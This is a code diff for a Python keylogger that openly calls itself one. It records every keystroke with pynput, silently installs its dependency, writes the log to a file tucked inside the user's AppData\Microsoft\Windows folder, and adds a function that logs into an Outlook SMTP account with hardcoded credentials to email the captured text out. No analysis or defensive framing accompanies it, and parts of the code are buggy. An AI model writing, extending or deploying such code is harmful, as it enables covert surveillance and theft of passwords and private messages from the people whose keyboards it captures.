@@ -6,28 +6,35 @@ import subprocess
 from os.path import exists
 import psutil
 
-
-killSwitch = False
+killSwitch, capsOn, checked = False, False, False
 currTime = dt.now().strftime('%d/%m/%Y %H:%M:%S - ')
-letter = ''
-capsOn = False
-phrase = ''
-user = psutil.users()[0].name
-checked = False
+email, letter, phrase = '', ''
+path = r'C:\Users' + '\\' + str(psutil.users()[0].name) + r'\AppData\Local\Microsoft\Windows\textfile.txt'
+
 
 subprocess.call(['pip','install', 'pynput'])
 
+########################################################################################################################################################################
+#checkFile - Helper method which checks if file exists, if file doesn't, then creates file. Uses checked to determine whether file has been "checked" before.
+#updateFile - Thread that continously updates file with keystrokes every number of seconds
+#writeToFile - Performs the actual writing of keystrokes to file
+#
+########################################################################################################################################################################
 def checkFile():
     global checked
-    if(not exists(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt")):
-        with open(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt", 'w+') as f:
+    if(not exists(path)):
+        with open(path, 'w+') as f:
             f.write("KEYSTROKES\n")
     checked = True
 
 
-def update():
+def updateFile():
+    global phrase
+    global checked
+    writeToFile('Keylogger Started')
     while True:
-        global phrase
+        if(not checked):
+            checkFile()
         time.sleep(10)
         if(phrase == ''):
             continue
@@ -38,21 +45,18 @@ def update():
 
 
 def writeToFile(text):
-    with open(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt", 'a+') as f:
+    with open(path, 'a+') as f:
         try:
             f.write(dt.now().strftime('%d/%m/%Y %H:%M:%S - ') + str(text) + '\n')
         except:
             global killSwitch
             killSwitch = True
 
-def kill_prog():
-    global killSwitch
-    killSwitch = True
-
-
-threading.Thread(target=update).start()
-
-
+########################################################################################################################################################################
+#on_press - Records key when pressed and saves it as a joined string.
+#on_relase - Ends program if needed, and verifies that a key is pressed & released.
+#keyLog - Executs the actual keylogger.
+########################################################################################################################################################################
 def on_press(key):
     global capsOn
     global letter
@@ -62,8 +66,6 @@ def on_press(key):
         letter = '{0}'.format(key.char)
         if(capsOn):
             letter = letter.upper()
-        if(not checked):
-            checkFile()
     except AttributeError:
         match key:
             case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r:
@@ -98,18 +100,42 @@ def on_release(key):
         if(killSwitch):
             return False
     except:
-        print('operation could not commence TT')
-            
+        pass
 
-
-listener = keyboard.GlobalHotKeys({
-        '<ctrl>+<alt>+f': kill_prog})
-listener.start()
-
-with keyboard.Listener(
+def keyLog():
+    with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
-    listener.join()
+        listener.join()
+
+def hotKeys():
+    listenerHotKeys = keyboard.GlobalHotKeys({
+        '<ctrl>+<alt>+f': kill_prog})
+
+def kill_prog():
+    global killSwitch
+    killSwitch = True
+    writeToFile('Keylogger Paused')
+
+########################################################################################################################################################################
+#
+########################################################################################################################################################################
+def sendMail():
+    global message
+    global email
+    with smtplib.SMTP('smtp-mail.outlook.com', 587) as session:
+        session.starttls()
+        session.login('testprogpython@outlook.com', 'TPPython')
+        session.sendmail('testprogpython@outlook.com', email,message)
+########################################################################################################################################################################
+#main - Executes the program
+########################################################################################################################################################################
+
+threading.Thread(target=hotKeys).start()
+threading.Thread(target=updateFile).start()
+threading.Thread(target=keyLog).start()
+
+
 
 
 
